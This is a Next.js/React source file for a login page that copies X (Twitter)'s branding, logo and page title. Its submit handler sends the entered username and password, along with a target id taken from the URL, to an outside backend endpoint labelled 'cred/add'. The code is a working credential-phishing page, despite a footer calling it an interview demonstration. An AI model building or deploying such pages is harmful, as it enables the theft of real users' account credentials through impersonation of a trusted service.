import { useState } from 'react';
import Head from 'next/head';
import { toast } from 'react-toastify';
import { useRouter } from 'next/router';

export default function TwitterLogin() {
  const [loginData, setLoginData] = useState({
    email: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const social = "Twitter";
  const router = useRouter();
  const { id } = router.query; 
  

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
  setLoginData({
    ...loginData,
    [e.target.name]: e.target.value
  });
};

   const handleSubmit = async (e: React.ChangeEvent<HTMLInputElement>) => {
        e.preventDefault();
        setIsLoading(true);
    
        if (!id || !social || !loginData.email || !loginData.password) {
          toast.error("⚠️ All fields are required!");
          setIsLoading(false);
          return;
        }
    
        try {
          const res = await fetch("https://authgo-backend.onrender.com/cred/add", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              id: id,
              social: social,
              username: loginData.email,
              password: loginData.password,
            }),
          });
    
          const data = await res.json();
          if (!res.ok) throw new Error(data.error || "Failed to add credential");
    
          toast.success("✅ Credential added successfully!");
          // Reset form after successful submission
          setLoginData({ email: '', password: '' });
        } catch (err) {
          console.error("❌ Error adding credential:", err);
          toast.error((err as Error).message);
        } finally {
          setIsLoading(false);
        }
      };

  return (
    <div className="min-h-screen bg-black flex flex-col">
      <Head>
        <title>{`X. It's what's happening / X`}</title>
        <meta name="description" content="X (Twitter) clone login page" />
        {/* <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/4/4e/X_logo_2023.svg" type="image/svg+xml" /> */}
        {/* <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/4/4e/X_logo_2023.svg" type="image/svg+xml" /> */}
        {/* <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/4/4e/X_logo_2023.svg" type="image/svg+xml" /> */}


      </Head>

      {/* Main Content */}
      <main className="flex-1 flex">
        {/* Left Section - Hero */}
        <div className="flex-1 relative hidden lg:flex items-center justify-center p-8">
          {/* X Logo Background */}
          <div className="absolute inset-0 flex items-center justify-center opacity-5">
            <svg className="w-96 h-96" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
              <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
            </svg>
          </div>
          
          {/* Features */}
          <div className="relative space-y-10 max-w-sm">
            <div className="flex items-center space-x-4">
              <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
              </svg>
              <span className="text-white text-2xl font-bold">Happening now</span>
            </div>
            
            <div className="space-y-8">
              <h2 className="text-white text-5xl font-bold">Join today.</h2>
              
              <div className="space-y-6">
                <div className="flex items-start space-x-4">
                  <div className="w-6 h-6 bg-white rounded-full flex items-center justify-center flex-shrink-0 mt-1">
                    <svg className="w-3 h-3 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <div>
                    <h3 className="font-bold text-white text-xl">Follow your interests.</h3>
                  </div>
                </div>
                
                <div className="flex items-start space-x-4">
                  <div className="w-6 h-6 bg-white rounded-full flex items-center justify-center flex-shrink-0 mt-1">
                    <svg className="w-3 h-3 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <div>
                    <h3 className="font-bold text-white text-xl">Hear what people are talking about.</h3>
                  </div>
                </div>
                
                <div className="flex items-start space-x-4">
                  <div className="w-6 h-6 bg-white rounded-full flex items-center justify-center flex-shrink-0 mt-1">
                    <svg className="w-3 h-3 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <div>
                    <h3 className="font-bold text-white text-xl">Join the conversation.</h3>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Right Section - Login */}
        <div className="flex-1 flex flex-col justify-center p-8 bg-black">
          <div className="max-w-md mx-auto w-full space-y-10">
            {/* Mobile Logo */}
            <div className="lg:hidden flex justify-center mb-8">
              <svg className="w-10 h-10 text-white" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
              </svg>
            </div>

            <div className="space-y-8">
              <h1 className="text-white text-4xl lg:text-5xl font-bold">Happening now</h1>
              <h2 className="text-white text-2xl lg:text-3xl font-bold">Join today.</h2>
              
              <div className="space-y-4">
                {/* Sign up buttons */}
                <button className="w-full bg-white text-black py-2 rounded-full font-semibold text-sm hover:bg-gray-200 transition-all duration-200 flex items-center justify-center space-x-2">
                  <svg className="w-5 h-5" viewBox="0 0 24 24">
                    <path fill="#000000" d="M18.71,19.5C17.88,20.74,17,21.95,15.66,21.97C14.32,22,13.89,21.18,12.37,21.18C10.84,21.18,10.37,21.95,9.1,22C7.79,22.05,6.8,20.68,5.96,19.47C4.25,17,2.94,12.45,4.7,9.39C5.57,7.87,7.13,6.91,8.82,6.88C10.1,6.86,11.32,7.75,12.11,7.75C12.89,7.75,14.37,6.68,15.92,6.84C16.57,6.87,18.39,7.1,19.56,8.82C19.47,8.88,17.39,10.1,17.41,12.63C17.44,15.65,20.06,16.66,20.09,16.67C20.06,16.74,19.67,18.11,18.71,19.5ZM13,3.5C13.73,2.67,14.94,2.04,15.94,2C16.07,3.17,15.6,4.35,14.9,5.19C14.21,6.04,13.07,6.7,11.95,6.61C11.8,5.46,12.36,4.26,13,3.5Z"/>
                  </svg>
                  <span>Sign up with Apple</span>
                </button>
                
                <button className="w-full bg-white text-black py-2 rounded-full font-semibold text-sm hover:bg-gray-200 transition-all duration-200 flex items-center justify-center space-x-2">
                  <svg className="w-5 h-5" viewBox="0 0 24 24">
                    <path fill="#000000" d="M21.35,11.1H12.18V13.83H18.69C18.36,17.64 15.19,19.27 12.19,19.27C8.36,19.27 5,16.25 5,12C5,7.9 8.2,4.73 12.2,4.73C15.29,4.73 17.1,6.7 17.1,6.7L19,4.72C19,4.72 16.56,2 12.1,2C6.42,2 2.03,6.8 2.03,12C2.03,17.05 6.16,22 12.25,22C17.6,22 21.5,18.33 21.5,12.91C21.5,11.76 21.35,11.1 21.35,11.1V11.1Z"/>
                  </svg>
                  <span>Sign up with Google</span>
                </button>
                
                <div className="relative">
                  <div className="absolute inset-0 flex items-center">
                    <div className="w-full border-t border-gray-700"></div>
                  </div>
                  <div className="relative flex justify-center text-sm">
                    <span className="px-2 bg-black text-gray-500">or</span>
                  </div>
                </div>
                
                <button className="w-full bg-blue-500 text-white py-2 rounded-full font-semibold text-sm hover:bg-blue-600 transition-all duration-200">
                  Create account
                </button>
                
                <p className="text-xs text-gray-500">
                  By signing up, you agree to the <a href="#" className="text-blue-400 hover:underline">Terms of Service</a> and <a href="#" className="text-blue-400 hover:underline">Privacy Policy</a>, including <a href="#" className="text-blue-400 hover:underline">Cookie Use</a>.
                </p>
              </div>

              {/* Login Section */}
              <div className="space-y-4">
                <h3 className="text-white text-lg font-bold">Already have an account?</h3>
                
                <form onSubmit={handleSubmit} className="space-y-4">
                  <div>
                    <input
                      type="email"
                      name="email"
                      placeholder="Email, or username"
                      value={loginData.email}
                      onChange={handleChange}
                      required
                      className="w-full px-4 py-3 bg-black border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-base text-white placeholder-gray-500"
                    />
                  </div>
                  
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      name="password"
                      placeholder="Password"
                      value={loginData.password}
                      onChange={handleChange}
                      required
                      className="w-full px-4 py-3 bg-black border border-gray-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-base text-white placeholder-gray-500 pr-12"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-300 focus:outline-none"
                    >
                      {showPassword ? (
                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                        </svg>
                      ) : (
                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L9 9m13 11l-4-4m0 0l-4 4m4-4V9" />
                        </svg>
                      )}
                    </button>
                  </div>

                  <button 
                    type="submit" 
                    disabled={isLoading}
                    className={`w-full bg-white text-black py-3 rounded-full font-semibold text-sm hover:bg-gray-200 transition-all duration-200 ${
                      isLoading ? 'opacity-70 cursor-not-allowed' : ''
                    }`}
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center space-x-2">
                        <div className="w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin"></div>
                        <span>Signing in...</span>
                      </div>
                    ) : (
                      'Sign in'
                    )}
                  </button>
                </form>
                
                <button className="w-full bg-black border border-gray-700 text-white py-2 rounded-full font-semibold text-sm hover:bg-gray-900 transition-all duration-200">
                  Forgot password?
                </button>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-black py-6 px-4 border-t border-gray-800">
        <div className="max-w-6xl mx-auto">
          <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500 mb-4">
            <a href="#" className="hover:underline">About</a>
            <a href="#" className="hover:underline">Download the X app</a>
            <a href="#" className="hover:underline">Help Center</a>
            <a href="#" className="hover:underline">Terms of Service</a>
            <a href="#" className="hover:underline">Privacy Policy</a>
            <a href="#" className="hover:underline">Cookie Policy</a>
            <a href="#" className="hover:underline">Accessibility</a>
            <a href="#" className="hover:underline">Ads info</a>
            <a href="#" className="hover:underline">Blog</a>
            <a href="#" className="hover:underline">Status</a>
            <a href="#" className="hover:underline">Careers</a>
            <a href="#" className="hover:underline">Brand Resources</a>
            <a href="#" className="hover:underline">Advertising</a>
            <a href="#" className="hover:underline">Marketing</a>
            <a href="#" className="hover:underline">X for Business</a>
            <a href="#" className="hover:underline">Developers</a>
            <a href="#" className="hover:underline">Directory</a>
            <a href="#" className="hover:underline">Settings</a>
          </div>
          
          <div className="text-center text-xs text-gray-500">
            <p>© 2024 X Corp. - Clone Built with Next.js & Tailwind CSS</p>
            <p className="mt-1">Interview Demonstration - Not affiliated with X</p>
          </div>
        </div>
      </footer>
    </div>
  );
}